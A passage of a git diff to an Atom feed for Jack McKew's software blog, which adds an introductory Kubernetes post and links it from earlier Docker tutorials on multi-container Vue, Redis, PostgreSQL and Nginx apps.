@@ -1,5 +1,103 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog - Software</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/software.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-11-06T00:00:00+11:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Develop and Deploy Multi-Container Applications</title><link href="https://jackmckew.dev/develop-and-deploy-multi-container-applications.html" rel="alternate"></link><published>2020-11-06T00:00:00+11:00</published><updated>2020-11-06T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-11-06:/develop-and-deploy-multi-container-applications.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Following on with previous posts on this blog. This post will be going through how to develop &amp;amp; deploy a multi-container application, our application (albeit basic) will allow users to input a number which will correspond to the index in the Fibonacci sequence, and our application will respond with the computed …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Following on with previous posts on this blog. This post will be going through how to develop &amp;amp; deploy a multi-container application, our application (albeit basic) will allow users to input a number which will correspond to the index in the Fibonacci sequence, and our application will respond with the computed number. Redis will store this number locally to give users a list of recently requested indexes, and PostgreSQL will store the input and output. More specifically we will be using the following technologies:&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog - Software</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/software.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-11-13T00:00:00+11:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Intro to Kubernetes</title><link href="https://jackmckew.dev/intro-to-kubernetes.html" rel="alternate"></link><published>2020-11-13T00:00:00+11:00</published><updated>2020-11-13T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-11-13:/intro-to-kubernetes.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Kubernetes is a portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. We use Kubernetes as a platform for orchestrating multiple Docker containers for our application, and enables us to scale our application easily.&lt;/p&gt;
+&lt;p&gt;Kubernetes is managed via a master node, and …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Kubernetes is a portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. We use Kubernetes as a platform for orchestrating multiple Docker containers for our application, and enables us to scale our application easily.&lt;/p&gt;
+&lt;p&gt;Kubernetes is managed via a master node, and worker nodes, in combination we call this a cluster. We give instructions to the master node on how we want the cluster to run, and how many workers we need.&lt;/p&gt;
+&lt;p&gt;This post is apart of a series on Docker/Kubernetes, find the other posts at:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-docker.html"&gt;Intro to Docker&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-with-docker.html"&gt;Develop and Develop with Docker&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-multi-container-applications.html"&gt;Develop and Develop Multi Container Applications&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="Kubernetes Logo" class="img-fluid" src="https://jackmckew.dev/img/Kubernetes-logo.png"/&gt;&lt;/p&gt;
+&lt;h2 id="minikube"&gt;Minikube&lt;/h2&gt;
+&lt;p&gt;Minikube is a way of running a development cluster on our local PC. When running in production however, we use managed services offered by different platforms (eg, AWS, GCP, etc). To interact with &lt;code&gt;minikube&lt;/code&gt; as it is running though, we use another tool called &lt;code&gt;kubectl&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id="docker-compose-to-kubernetes"&gt;Docker Compose to Kubernetes&lt;/h2&gt;
+&lt;table class="table-striped table"&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Docker Compose Terminology&lt;/th&gt;
+&lt;th&gt;Kubernetes Terminology&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Each entry could build an image&lt;/td&gt;
+&lt;td&gt;Kubernetes expects all images to be built&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Each entry represents a container&lt;/td&gt;
+&lt;td&gt;One config file per object we want to create&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Each entry defines the networking configuration (ports)&lt;/td&gt;
+&lt;td&gt;We have to set up all networking manually&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="whats-an-object"&gt;What's an Object?&lt;/h3&gt;
+&lt;p&gt;Notice that we mentioned objects as the equivalent in Kubernetes, but what does this mean? Objects serve different purposes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Running a container&lt;/li&gt;
+&lt;li&gt;Monitoring a container&lt;/li&gt;
+&lt;li&gt;Setting up networking&lt;/li&gt;
+&lt;li&gt;etc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example object types include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;StatefulSet&lt;/li&gt;
+&lt;li&gt;ReplicaController&lt;/li&gt;
+&lt;li&gt;Pod&lt;/li&gt;
+&lt;li&gt;Service&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;There are multiple API versions which gives us access to a different set of object types&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id="pods"&gt;Pods&lt;/h4&gt;
+&lt;p&gt;Pods let us run containers within nodes. These are one of the most basic objects we can create within Kubernetes. Typically we only put containers that are tightly coupled together within a pod. For example, we might run a database pod which is comprised of 3 containers, the database runtime, a logger and a backup manager. Since if any of these are solely dependant on other containers running, it makes sense to group them together in a pod.&lt;/p&gt;
+&lt;h4 id="services"&gt;Services&lt;/h4&gt;
+&lt;p&gt;Services let us set up networking within a Kubernetes cluster. There is also 4 sub-types of services:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ClusterIP&lt;/li&gt;
+&lt;li&gt;NodePort&lt;/li&gt;
+&lt;li&gt;Ingress&lt;/li&gt;
+&lt;li&gt;LoadBalancer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;NodePort services allow us to expose a container to the outside network (only for development purposes). We can use selectors and labels to be the equivalent of our service names in docker-compose.&lt;/p&gt;
+&lt;h4 id="deployment"&gt;Deployment&lt;/h4&gt;
+&lt;p&gt;The deployment object type is better for running groups of identical pods, as the master can manage all the changes &amp;amp; updates for our pods for us (see below for limitations when using pods alone).&lt;/p&gt;
+&lt;p&gt;Similar to the pod yaml file, the &lt;code&gt;template&lt;/code&gt; tag takes the exact same information to create any number of pods (replicas) as specified.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ensure to use matchLabels if using labels for the pods, as this will give the master information for updating the cluster.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We can check all the deployments currently running with &lt;code&gt;kubectl get deployments&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id="kubectl"&gt;Kubectl&lt;/h2&gt;
+&lt;p&gt;Kubectl is the tool that we use to manage our Kubernetes clusters. If we want to pass a config file into &lt;code&gt;kubectl&lt;/code&gt; we use the command &lt;code&gt;kubectl apply -f [filename]&lt;/code&gt;. Similar to &lt;code&gt;docker ps&lt;/code&gt;, if we want to see all the running pods in our cluster, we can run &lt;code&gt;kubectl get pods&lt;/code&gt;. Furthermore, to get all the running services we can run &lt;code&gt;kubectl get services&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Once we have a pod running, we can check to see what containers are running with &lt;code&gt;docker ps&lt;/code&gt;. If we kill the container running inside the pod, we will notice that if we run &lt;code&gt;docker ps&lt;/code&gt; once again, it'll be live again. Kubernetes will try to restart any containers if anything goes wrong. Kubernetes will try it's best to keep the application in the state that we provide in the configuration.&lt;/p&gt;
+&lt;h3 id="update-existing-object"&gt;Update Existing Object&lt;/h3&gt;
+&lt;p&gt;If a configuration has been provided a &lt;code&gt;name&lt;/code&gt; in the &lt;code&gt;metadata&lt;/code&gt;, the running object can be updated by changing the configuration provided the &lt;code&gt;name&lt;/code&gt; remains the same.&lt;/p&gt;
+&lt;p&gt;This updated configuration can then be applied with &lt;code&gt;kubectl apply -f [filename]&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;There is only a specific number of parameters we can change with this (eg for pods: image, activeDeadlineSeconds, etc). Which you will see an error if the variable falls outside the provided.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;For maintaining sets of identical pods, we can bypass the limitations on what fields we can update with the &lt;code&gt;Deployment&lt;/code&gt; object kind. Pods are good for one-off development purposes, while Deployments are better for development &amp;amp; production.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Deployment updates work by attempting to make the changes, and if the above error occurs, it'll automatically kill the pod and restart with the updated configuration.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id="get-info-about-an-existing-object"&gt;Get Info about an Existing Object&lt;/h3&gt;
+&lt;p&gt;If we had an object running within a cluster, and we wanted to get information about it, we can run &lt;code&gt;kubectl describe [object_type] [object_name]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Similarly, we can extract information about all objects of a certain type in the cluster by omitting the &lt;code&gt;object_name&lt;/code&gt;. So our command would be &lt;code&gt;kubectl [object_type]&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="deleting-existing-objects"&gt;Deleting Existing Objects&lt;/h3&gt;
+&lt;p&gt;Similar to &lt;code&gt;docker stop&lt;/code&gt;, we can use &lt;code&gt;kubectl delete -f [config_yaml]&lt;/code&gt; to stop and delete an object from the cluster.&lt;/p&gt;
+&lt;h3 id="update-deployment-images"&gt;Update Deployment Images&lt;/h3&gt;
+&lt;p&gt;A workflow for Kubernetes is we want our application to keep running, and when we push a new image to Docker Hub, we want our Kubernetes cluster to update the objects running on this image, with the updated image.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This is very challenging, here is a very thorough thread on a conversation discussing ways to do this: &lt;a href="https://github.com/kubernetes/kubernetes/issues/33664"&gt;https://github.com/kubernetes/kubernetes/issues/33664&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;To do this imperatively, we ensure that the image we will be pulling is tagged with versioning on Docker Hub. After this we are able to run the command&lt;/p&gt;
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kubectl &lt;span class="nb"&gt;set&lt;/span&gt; image &lt;span class="o"&gt;[&lt;/span&gt;object_type&lt;span class="o"&gt;]&lt;/span&gt; / &lt;span class="o"&gt;[&lt;/span&gt;object_name&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;container_name&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;new_image_to_use&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;After running this command, the deployment will update the running pods with the new image.&lt;/p&gt;</content><category term="Software"></category><category term="software"></category></entry><entry><title>Develop and Deploy Multi-Container Applications</title><link href="https://jackmckew.dev/develop-and-deploy-multi-container-applications.html" rel="alternate"></link><published>2020-11-06T00:00:00+11:00</published><updated>2020-11-06T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-11-06:/develop-and-deploy-multi-container-applications.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Following on with previous posts on this blog. This post will be going through how to develop &amp;amp; deploy a multi-container application, our application (albeit basic) will allow users to input a number which will correspond to the index in the Fibonacci sequence, and our application will respond with the computed …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Following on with previous posts on this blog. This post will be going through how to develop &amp;amp; deploy a multi-container application, our application (albeit basic) will allow users to input a number which will correspond to the index in the Fibonacci sequence, and our application will respond with the computed number. Redis will store this number locally to give users a list of recently requested indexes, and PostgreSQL will store the input and output. More specifically we will be using the following technologies:&lt;/p&gt;
 &lt;table class="table-striped table"&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -51,6 +149,7 @@
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-docker.html"&gt;Intro to Docker&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-with-docker.html"&gt;Develop and Develop with Docker&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-kubernetes.html"&gt;Intro to Kubernetes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="vue"&gt;Vue&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;Find all the source code for the front end client at: &lt;a href="https://github.com/JackMcKew/multi-docker/tree/master/client"&gt;https://github.com/JackMcKew/multi-docker/tree/master/client&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
@@ -61,7 +160,7 @@
 &lt;h3 id="fibinputform-component"&gt;FibInputForm Component&lt;/h3&gt;
 &lt;p&gt;Components are pieces of user interface that we can access in multiple parts of our application, we build a component which will contain both the HTML and javascript for driving the user input, and for displaying the output retrieved from Redis or PostgreSQL. Vue components are typically comprised of a &lt;code&gt;template&lt;/code&gt; block and a corresponding &lt;code&gt;script&lt;/code&gt; and &lt;code&gt;style&lt;/code&gt; block. When writing the template for a component, there is numerous Vue specific attributes that we can provide the elements in the HTML. For this project we will make use of Bulma/Buefy CSS (which can be installed with &lt;code&gt;npm install bulma&lt;/code&gt; or &lt;code&gt;npm install buefy&lt;/code&gt;) for our styling.&lt;/p&gt;
 &lt;p&gt;We create a file named &lt;code&gt;FibInputForm.vue&lt;/code&gt; inside &lt;code&gt;project_name/src/components&lt;/code&gt; with the contents:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -217,7 +316,7 @@
 &lt;p&gt;To briefly cover the functionality above, the template is built up of 3 parts, the input form where users submit an index to query, a list of the latest indexes as stored in Redis separated by a comma and finally a list of the calculated as retrieved from the PostgreSQL database. We use &lt;code&gt;axios&lt;/code&gt; to interface we the API that we will create with &lt;code&gt;express&lt;/code&gt;. We query the API upon load, and the page is always reloaded when submit is pressed. Now that this has been exported, it can be imported from any other point in our web application and placed in with a &lt;code&gt;&amp;lt;FibInputForm/&amp;gt;&lt;/code&gt; element! Neat!&lt;/p&gt;
 &lt;h3 id="fibinputpage-view"&gt;FibInputPage View&lt;/h3&gt;
 &lt;p&gt;Now that we have our component, we need a page to put it on! We create a new file within &lt;code&gt;project_name/src/views&lt;/code&gt; named &lt;code&gt;FibInputPage.vue&lt;/code&gt; with the contents:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -267,7 +366,7 @@
 &lt;p&gt;As we can see above, we've imported our neat little &lt;code&gt;FibInputForm&lt;/code&gt; and used it after placing it in a centered section. Again we export the page view so we can import into the router to make sure it's linked to a URL.&lt;/p&gt;
 &lt;h3 id="routing-the-page"&gt;Routing the Page&lt;/h3&gt;
 &lt;p&gt;Lastly for Vue, we need to set up a route so users can reach our page, both within the &lt;code&gt;vue-router&lt;/code&gt; and on the main page (&lt;code&gt;App.vue&lt;/code&gt;). Routes are all defined within &lt;code&gt;project_name/router/index.ts&lt;/code&gt;. So we need to add in a new one for our &lt;code&gt;FibInputPage&lt;/code&gt; by adding the following object into the routes array:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -287,7 +386,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p&gt;Next to ensure the route is accessible from a link on the page, add a &lt;code&gt;router-link&lt;/code&gt; element into the template of &lt;code&gt;App.vue&lt;/code&gt;:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;router-link&lt;/span&gt; &lt;span class="na"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"/fib"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Fib&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;router-link&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; |
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;router-link&lt;/span&gt; &lt;span class="na"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"/fib"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Fib&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;router-link&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; |
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h2 id="redis"&gt;Redis&lt;/h2&gt;
@@ -295,7 +394,7 @@
 &lt;p&gt;Redis is an open source, in-memory data store, we give it a key and a value, which it'll store. Later we can ask with the key, and get the value back. We are going to set up two parts to make this service work as expected. The redis runtime is managed for us directly from using the redis image as provided on Docker Hub, but we need to make a node.js project to interface with it.&lt;/p&gt;
 &lt;p&gt;We do this by creating 3 files: &lt;code&gt;package.json&lt;/code&gt;, &lt;code&gt;index.js&lt;/code&gt; and &lt;code&gt;keys.js&lt;/code&gt;. &lt;code&gt;package.json&lt;/code&gt; defines what dependencies need to be installed, and how to run the project. &lt;code&gt;index.js&lt;/code&gt; manages the redis client and contains the functionality for calculating the fibonacci sequence when given an index. &lt;code&gt;keys.js&lt;/code&gt; contains any environment variables that the project may need. In particular we use environment variables so docker-compose can link all the services together later on.&lt;/p&gt;
 &lt;p&gt;Here is the code for the core of this project, &lt;code&gt;index.js&lt;/code&gt;:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -342,7 +441,7 @@
 &lt;h2 id="postgresql"&gt;PostgreSQL&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;Find all the source code for the PostgreSQL service at: &lt;a href="https://github.com/JackMcKew/multi-docker/tree/master/server"&gt;https://github.com/JackMcKew/multi-docker/tree/master/server&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;We are going to use the PostgreSQL service part of our project to contain the interface with the database, and the API with &lt;code&gt;express&lt;/code&gt;. Very similar to our redis project, we need a &lt;code&gt;package.json&lt;/code&gt;, &lt;code&gt;index.js&lt;/code&gt; and &lt;code&gt;keys.js&lt;/code&gt;. Let's dive straight into the code inside &lt;code&gt;index.js&lt;/code&gt;:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -529,7 +628,7 @@
 &lt;h2 id="nginx"&gt;Nginx&lt;/h2&gt;
 &lt;p&gt;Nginx in this project helps us create all the connections between the services and for them all to play nicely. How nginx works is by defining any connections in a configuration file, and pass that configuration file upon runtime.&lt;/p&gt;
 &lt;p&gt;This is our &lt;code&gt;default.conf&lt;/code&gt; nginx configuration for this project:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -579,7 +678,7 @@
 &lt;p&gt;We also set up a few locations, these help nginx 'finish' the route. &lt;code&gt;/&lt;/code&gt; means any incoming connection, pass it off to the front end to render. If any request connection comes in containing &lt;code&gt;/api&lt;/code&gt; then we want to pass that request to the service, so we rewrite the URL to be the correct URL.&lt;/p&gt;
 &lt;h2 id="docker-compose"&gt;Docker Compose&lt;/h2&gt;
 &lt;p&gt;Now that we've got our individual services all configured, we need a way to run them all at the same time. We need to create a &lt;code&gt;docker-compose.yml&lt;/code&gt; which will contain all the environment variables, and how each service depend/connect to each other so we can run it all!&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -714,7 +813,7 @@
 &lt;p&gt;Note that our environment variables (which were set in &lt;code&gt;keys.js&lt;/code&gt; earlier), are just the name of the service given in the &lt;code&gt;docker-compose.yml&lt;/code&gt; file. Docker Compose handles all the renaming when each service is connected up for us! How awesome is that!&lt;/p&gt;
 &lt;h2 id="github-actions"&gt;Github Actions&lt;/h2&gt;
 &lt;p&gt;Now that we've set all of services and make sure they place nice in Docker Compose, it's time to implement CI/CD with Github Actions so whenever we push new versions of our code, it'll automatically test that everything works and deploy our new version of the application. We do this by creating a &lt;code&gt;test-and-deploy.yml&lt;/code&gt; within &lt;code&gt;.github/workflows/&lt;/code&gt; which contains:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -874,7 +973,7 @@
 &lt;p&gt;Everything's now set up! For another user or a deployment service to get each of the images for the services they've created they can now simply run &lt;code&gt;docker run jackmckew/multi-docker-client&lt;/code&gt; and that's it! It should run on any operating system provided Docker is installed, how cool is that!&lt;/p&gt;
 &lt;h2 id="deploying-to-aws-elastic-beanstalk"&gt;Deploying to AWS Elastic Beanstalk&lt;/h2&gt;
 &lt;p&gt;Now we want to deploy this application to Elastic Beanstalk, that means we need to create a &lt;code&gt;Dockerrun.aws.json&lt;/code&gt; which is very similar to that of the &lt;code&gt;docker-compose.yml&lt;/code&gt;. The contents of the json file will be:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -981,10 +1080,11 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-docker.html"&gt;Intro to Docker&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://jackmckew.dev/develop-and-deploy-multi-container-applications.html"&gt;Develop and Develop Multi Container Applications&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jackmckew.dev/intro-to-kubernetes.html"&gt;Intro to Kubernetes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="the-web-application"&gt;The Web Application&lt;/h2&gt;
 &lt;p&gt;For the web app we will use React, which is a javascript framework for managing the front end of applications. To generate the web app boilerplate for us, we will use &lt;code&gt;create-react-app&lt;/code&gt;. For running this, ensure that Node.js is installed on the local PC. Finally run the command below, to initialise the front end component of React of our web app.&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;npx create-react-app frontend --template typescript
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;npx create-react-app frontend --template typescript
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;blockquote&gt;
@@ -993,7 +1093,7 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;h2 id="dockerfile"&gt;Dockerfile&lt;/h2&gt;
 &lt;p&gt;For this workflow we're going to set up two Dockerfiles, one for developing and one for production. Let's start with the developers Dockerfile, which we will aptly name &lt;code&gt;Dockerfile.dev&lt;/code&gt;, we must ensure to add the &lt;code&gt;-f&lt;/code&gt; flag along with the filename when building the Docker image with &lt;code&gt;docker build -f Dockerfile.dev .&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The contents of our &lt;code&gt;Dockerfile.dev&lt;/code&gt; will contain:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="highlighttable table table-striped"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -1023,16 +1123,16 @@ This workflow is 100% achievable without Docker, although Docker will make thing
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p&gt;To circumvent the issue in that Docker typically takes snapshots of the code and we want our app to update on save, we use mount to create a 'reference' to our folder on the local PC. We do this by running the command:&lt;/p&gt;
